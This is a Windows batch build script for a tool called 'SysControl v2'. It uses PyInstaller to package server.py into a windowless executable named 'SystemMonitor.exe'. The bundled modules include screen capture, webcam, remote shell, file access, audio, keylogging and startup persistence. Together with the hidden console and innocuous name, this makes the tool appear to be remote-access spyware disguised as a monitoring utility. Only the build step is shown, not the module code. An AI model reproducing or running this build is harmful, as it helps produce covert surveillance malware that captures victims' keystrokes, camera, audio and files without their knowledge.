@echo off
echo ========================================
echo   SysControl v2 — Building .exe
echo ========================================
echo.

if not exist ".venv" (
    echo Creating virtual environment...
    python -m venv .venv
)

call .venv\Scripts\activate.bat
echo Installing dependencies...
pip install -r requirements.txt -q
pip install pyinstaller -q

echo.
echo Building executable...
pyinstaller --onefile --noconsole --name "SystemMonitor" ^
    --add-data "features;features" ^
    --hidden-import features.screen ^
    --hidden-import features.webcam ^
    --hidden-import features.shell ^
    --hidden-import features.files ^
    --hidden-import features.system ^
    --hidden-import features.audio ^
    --hidden-import features.keylog ^
    --hidden-import features.startup ^
    --hidden-import cv2 ^
    --hidden-import numpy ^
    --hidden-import psutil ^
    --exclude-module tkinter ^
    --exclude-module unittest ^
    --exclude-module pydoc ^
    --exclude-module doctest ^
    --exclude-module test ^
    --exclude-module lib2to3 ^
    server.py
rem PyInstaller auto-compresses the exe if "upx" is on PATH. Install UPX for a smaller build.

echo.
if exist "dist\SystemMonitor.exe" (
    echo ========================================
    echo   SUCCESS! Built: dist\SystemMonitor.exe
    echo   Size:
    for %%I in (dist\SystemMonitor.exe) do echo   %%~zI bytes
    echo ========================================
) else (
    echo BUILD FAILED. Check errors above.
)
pause
